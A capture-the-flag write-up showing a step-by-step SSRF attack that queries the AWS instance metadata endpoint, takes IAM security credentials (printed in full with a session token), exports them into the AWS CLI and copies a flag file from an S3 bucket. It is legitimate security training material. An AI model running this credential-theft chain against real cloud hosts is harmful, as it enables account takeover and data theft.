# YarrrBot 2

## Description

Yarrr, ye found th' booty. well there's more where that came from if you want to keep searching. YarrrBots second treasure is deep in th' clouds of a giant forest.

**Category:** misc

**Difficulty:** Hard

**Author:** Rhys

**Flag:** AHOY{c10ud_55rf_5h1v3r_m3_t1mb3r5}

## Exploit

This is a more advanced SSRF in a cloud environment. First we have to figure out where the server is running. From the hint deep in the clouds of a giant forest. We can summarise that a giant forest is amazon. Amazons cloud would be AWS. So the server is probably running on an AWS EC2 machine.

When running on an EC2 machine amazon provides something called the instance metadata api. This contains information about your ec2 machine.

1.  First we want to confirm we are on ec2 and can access the metadata api. we can do this with a request to http://169.254.169.254/latest/meta-data/

    `/yarrr url: http://169.254.169.254/latest/meta-data/`

    This returns

    `ami-id ami-launch-index ami-manifest-path block-device-mapping/ events/ hostname iam/ identity-credentials/ instance-action instance-id instance-life-cycle instance-type ipv6 local-hostname local-ipv4 mac managed-ssh-keys/ metrics/ network/ placement/ profile public-hostname public-ipv4 public-keys/ reservation-id security-groups services/`

2.  Now we have a response from the instance metadata api we can query lots of information about the server. In this case we want to look at `iam` (AWS Identity and Access Management)

    `/yarrr url: http://169.254.169.254/latest/meta-data/iam`

    This lists the folders `info` and `security-credentials`.

    `info security-credentials/`

3.  List the `security-credentials`

    `/yarrr url: http://169.254.169.254/latest/meta-data/iam/security-credentials`

    This returns a credential called `Yarrr`

    `Yarrr`

4.  Query the `Yarrr` credential

    `/yarrr url: http://169.254.169.254/latest/meta-data/iam/security-credentials/Yarrr`

    We get a blob of JSON back

    ```json
    { "Code" : "Success", "LastUpdated" : "2022-08-10T09:33:30Z", "Type" : "AWS-HMAC", "AccessKeyId" : batten down the hatches! "ASIARSHZSGPVAD7AMFF5", "SecretAccessKey" : thar she blows! "mRooMicKUNwT9gKCaF5KU3I+0CZwplrwxDSqf1ZK", "Token" : "IQoJb3JpZ2luX2VjENr//////////wEaCXVzLXdlc3QtMSJHMEUCIQDzAaBczPxtFjOs76QQ27eyqpQb/I6Xkko/+ZU5HmCFnwIgNaXAmsyszUw/izwj+qG7ZOs7DvGZ/lsE+xnsDUsjbXYq0gQIQxAAGgwxMDc4OTc1NjYxODYiDNa3v+j1OGRAxX8XgyqvBIOgzN2XFlG+4Fbqz3zlK203y0lx0ioRePjhXIsvNd7CH4M1YV4AH35tdPVWatDtawzkDP6LP7v5NjlEPhh1ZZ1/SbJRuBKnnSlL+uSo+Am2bVG7D7JKR6X8nutrvTD7amDo7hL/Th2JHkOKOTxNmh4YoAQyZbTMJSOmhz+8gap6p1P+b7ZTl56ivoM8dS+R2Mwfz4IzguvBEkJm4aJ+qzW0ckVUH1HevZc7eSTFZ3D7EQPlGC7oLzhmfIZuJ3+12ittRSiX0LNX9Eta5gHnqbjF/hmwokGF9WzRRFF698vQuk/OBc8hlo3gzfKesJLghjcRaYt/vtBCo7exlDf3RW+nvjhkUoyyAGoBOX71g9LYU57Tal5m+jBkFIAusi0RWG5yoZSnpRgPTK4iFaJMmYg0KElY/d1T4H/+FAIeJxyVyRfkYi5eEboznev47y1D2BN73QFFZwRClCxh/6buHkWob8uyWRy9jJ5UDYcWP7Ze7d46/6pwrxFucir9/HmD95z3ThPqyrfW9c6jkIvtsEXOzLPxNQ6LkksZ7Kcon1RH5n8v1QWnU0k/5/A0C9ATTU1M7ItfD7yZaqAQVF94NXUmg5i8Yu/eV4OZrz/8zu5fEHO2LAWRYUtGuyEreZsk1bRDLajjoEF6YKWfKOWdnTu5L9RycQhWYaBW8JqZHblkHLn5DXN8uk8sov+pnMisMq/ZNfiEuwylm7/GwboopLQY3B8fNoUW5iR/R4TvyDcw9fbNlwY6qQF4RZRjnk9qOGwTcAVeVRvTAP81yhnoBwSWmaR/2J6GFx2Q57iDalOoiMVdU9YHYSfbXiJBeVebvJ0+EizLD8rSrWAVWCsB5EjBFLzocLZ2n+T5Gy4C+LLLutREQaQyVN8VrqZGZydslq2Usbd79UD05v60Ab28nNRYmWqSOsUwRpuPKwr1PHZz4oNsKcnhwHLcJe5vLj/xD3Rb+Hb9St1eOZZI9Za+LOK9", "Expiration" : "2022-08-10T15:46:25Z" }
    ```

    This JSON contains a set of aws API credentials. These can be used to authenticate to the aws api.

    There is no way to tell from the credentials what aws apis they have access too. The only was to tell is query every single api and see if you can use it.

    There are scripts to do this online. But in this case where going to take a shortcut and say they have access to `s3`.

5.  Use the api keys withe aws cli to list s3 buckets

    ```bash
    $ export AWS_ACCESS_KEY_ID=ASIARSHZSGPVAD7AMFF5
    $ export AWS_SECRET_ACCESS_KEY=mRooMicKUNwT9gKCaF5KU3I+0CZwplrwxDSqf1ZK
    $ export AWS_SESSION_TOKEN=IQoJb3JpZ2luX2VjENr//////////wEaCXVzLXdlc3QtMSJHMEUCIQDzAaBczPxtFjOs76QQ27eyqpQb/I6Xkko/+ZU5HmCFnwIgNaXAmsyszUw/izwj+qG7ZOs7DvGZ/lsE+xnsDUsjbXYq0gQIQxAAGgwxMDc4OTc1NjYxODYiDNa3v+j1OGRAxX8XgyqvBIOgzN2XFlG+4Fbqz3zlK203y0lx0ioRePjhXIsvNd7CH4M1YV4AH35tdPVWatDtawzkDP6LP7v5NjlEPhh1ZZ1/SbJRuBKnnSlL+uSo+Am2bVG7D7JKR6X8nutrvTD7amDo7hL/Th2JHkOKOTxNmh4YoAQyZbTMJSOmhz+8gap6p1P+b7ZTl56ivoM8dS+R2Mwfz4IzguvBEkJm4aJ+qzW0ckVUH1HevZc7eSTFZ3D7EQPlGC7oLzhmfIZuJ3+12ittRSiX0LNX9Eta5gHnqbjF/hmwokGF9WzRRFF698vQuk/OBc8hlo3gzfKesJLghjcRaYt/vtBCo7exlDf3RW+nvjhkUoyyAGoBOX71g9LYU57Tal5m+jBkFIAusi0RWG5yoZSnpRgPTK4iFaJMmYg0KElY/d1T4H/+FAIeJxyVyRfkYi5eEboznev47y1D2BN73QFFZwRClCxh/6buHkWob8uyWRy9jJ5UDYcWP7Ze7d46/6pwrxFucir9/HmD95z3ThPqyrfW9c6jkIvtsEXOzLPxNQ6LkksZ7Kcon1RH5n8v1QWnU0k/5/A0C9ATTU1M7ItfD7yZaqAQVF94NXUmg5i8Yu/eV4OZrz/8zu5fEHO2LAWRYUtGuyEreZsk1bRDLajjoEF6YKWfKOWdnTu5L9RycQhWYaBW8JqZHblkHLn5DXN8uk8sov+pnMisMq/ZNfiEuwylm7/GwboopLQY3B8fNoUW5iR/R4TvyDcw9fbNlwY6qQF4RZRjnk9qOGwTcAVeVRvTAP81yhnoBwSWmaR/2J6GFx2Q57iDalOoiMVdU9YHYSfbXiJBeVebvJ0+EizLD8rSrWAVWCsB5EjBFLzocLZ2n+T5Gy4C+LLLutREQaQyVN8VrqZGZydslq2Usbd79UD05v60Ab28nNRYmWqSOsUwRpuPKwr1PHZz4oNsKcnhwHLcJe5vLj/xD3Rb+Hb9St1eOZZI9Za+LOK9

    $ aws s3 ls
    2022-08-04 10:02:08 yarrrmehearties
    ```

    6. We can see we have access to a bucket called `yarrrmehearties` so ls it

    ```bash
    $ aws s3 ls yarrrmehearties
    2022-08-10 22:22:16         35 flag.txt
    ```

    7. Copy out `flag.txt` and get the flag

    ```
    $ aws s3 cp s3://yarrrmehearties/flag.txt .
    $ cat flag.txt
    AHOY{c10ud_55rf_5h1v3r_m3_t1mb3r5}
    ```
